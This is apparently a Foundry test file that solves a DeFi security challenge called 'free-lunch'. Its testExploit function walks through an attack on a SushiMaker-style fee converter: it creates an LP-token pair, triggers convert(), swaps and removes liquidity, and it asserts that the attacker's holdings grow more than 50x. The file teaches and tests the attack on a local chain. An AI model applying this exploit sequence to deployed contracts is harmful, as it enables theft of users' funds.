// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/other/Token.sol";
import "../src/other/WETH9.sol";
import "../src/other/uniswap/v2/interfaces/IUniswapV2Router02.sol";
import {ISafuFactory, ISafuPair, SafuMakerV2} from "../src/free-lunch/SafuMakerV2.sol";
import "../src/free-lunch/Exploit.sol";


contract freeLunch is Test {
    address internal attacker;
    address internal deployer;
    address internal adminUser;
    address internal barAddress; //SushiBar contract address, irrelevant for exploit
    
    ISafuFactory internal safufactory;
    ISafuPair internal safupair; // starts with just one trading pool: USDC-SAFU
    IUniswapV2Router02 internal safurouter;
    SafuMakerV2 internal safumaker;
    WETH9 internal weth; // native token
    Token internal usdc; // base trading pair token
    Token internal safu; // farm token
    Exploit internal exploit;

    uint256 internal constant ATTACKER_INIT_TOKEN_AMOUNT = 100e18;
    uint256 internal constant CREATE_PAIR_TOKEN_AMOUNT = 1000000e18;

    
    function setUp() public {
        /******************************************
        *                   INFO                  *
        *             Some EOA address            *
        *******************************************/
        
        attacker = address(bytes20("attacker"));
        vm.label(attacker, "Attacker");
        
        adminUser = address(bytes20("adminUser"));
        vm.label(adminUser, "AdminUser");

        deployer = address(bytes20("deployer"));
        vm.label(deployer, "Deployer");

        barAddress = address(bytes20("baraddress"));
        vm.label(barAddress, "SushiBar");

        /******************************************
        *                  INFO                   *
        *            Deploy  contracts            *
        *******************************************/

        vm.startPrank(deployer);
        weth = new WETH9();
        
        address[] memory recipients = new address[](2);
        recipients[0] = attacker;
        recipients[1] = deployer;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = ATTACKER_INIT_TOKEN_AMOUNT;
        amounts[1] = CREATE_PAIR_TOKEN_AMOUNT;
        
        usdc = new Token('USDC','USDC');
        safu = new Token('SAFU','SAFU');
        
        usdc.mintPerUser(recipients, amounts);
        safu.mintPerUser(recipients, amounts);

        // deploying SafuSwap + SafuMaker contracts
        safufactory = ISafuFactory(
            deployCode(
                "./src/other/uniswap/v2/build/UniswapV2Factory.json",
                abi.encode(address(deployer))
            )
        );

        safurouter = IUniswapV2Router02(
            deployCode(
                "./src/other/uniswap/v2/build/UniswapV2Router02.json",
                abi.encode(address(safufactory), address(weth))
            )
        );
        
        safumaker = new SafuMakerV2(address(safufactory), barAddress, address(safu), address(usdc));

        // adding initial liquidity
        usdc.approve(address(safurouter), CREATE_PAIR_TOKEN_AMOUNT);
        safu.approve(address(safurouter), CREATE_PAIR_TOKEN_AMOUNT);

        safurouter.addLiquidity( // creates pair
            address(usdc),
            address(safu),
            CREATE_PAIR_TOKEN_AMOUNT,
            CREATE_PAIR_TOKEN_AMOUNT,
            0,
            0,
            address(deployer),
            block.timestamp * 2
        );
        
        // getting the USDC-SAFU trading pair
        safupair = ISafuPair(safufactory.getPair(address(usdc), address(safu)));

        // simulates trading activity, as LP is issued to feeTo address for trading rewards
        safupair.transfer(address(safumaker), 10000e18); // 1% of LP
        
        vm.label(address(weth), "WETH");
        vm.label(address(usdc), "USDC");
        vm.label(address(safu), "SAFU");
        vm.label(address(safufactory), "SafuFactory");
        vm.label(address(safurouter), "SafuRouter");
        vm.label(address(safumaker), "SafuMakerV2");
        vm.label(address(safupair), "Pair:USDC-SAFU");
        vm.stopPrank();
    }
    
    function testExploit() public {
        vm.startPrank(attacker, attacker);
        uint safu_usdc_lp_amount;
        uint safuusdclp_usdc_lp_amount;
        
        usdc.approve(address(safurouter), ATTACKER_INIT_TOKEN_AMOUNT);
        safu.approve(address(safurouter), ATTACKER_INIT_TOKEN_AMOUNT);
        
        ( , , safu_usdc_lp_amount) = safurouter.addLiquidity(
            address(usdc),
            address(safu),
            10e18,
            10e18,
            0,
            0,
            attacker,
            block.timestamp
        );
        
        safupair.approve(address(safurouter), type(uint256).max);

        ( , , safuusdclp_usdc_lp_amount) = safurouter.addLiquidity(
            address(safupair),
            address(safu),
            1e18,
            100,
            0,
            0,
            attacker,
            block.timestamp
       );

        address safuusdclp_usdc_lp_address = safufactory.getPair(address(safu), address(safupair));
        vm.label(safuusdclp_usdc_lp_address, "Pair:SAFU_USDC_LP-USDC");
        ISafuPair(safuusdclp_usdc_lp_address).transfer(address(safumaker), safuusdclp_usdc_lp_amount / 10);
        safumaker.convert(address(safu), address(safupair));
        
        address[] memory path = new address[](2);
        path[0] = address(safu);
        path[1] = address(safupair);

        safurouter.swapExactTokensForTokens(
            1e18,
            0,
            path,
            attacker,
            block.timestamp * 2
        );

        safurouter.removeLiquidity(
            address(usdc),
            address(safu),
            safupair.balanceOf(attacker),
            0,
            0,
            attacker,
            block.timestamp * 2
        );

        vm.stopPrank();
        verify();
    }

    function verify() internal {
        /******************************************
        *                 INFO                    *
        *    Verify completion of the challenge   *
        *******************************************/
        
        // attacker has increased both SAFU and USDC funds by at least 50x
        assertGt(usdc.balanceOf(attacker), ATTACKER_INIT_TOKEN_AMOUNT * 50);
        assertGt(safu.balanceOf(attacker), ATTACKER_INIT_TOKEN_AMOUNT * 50);
    }

}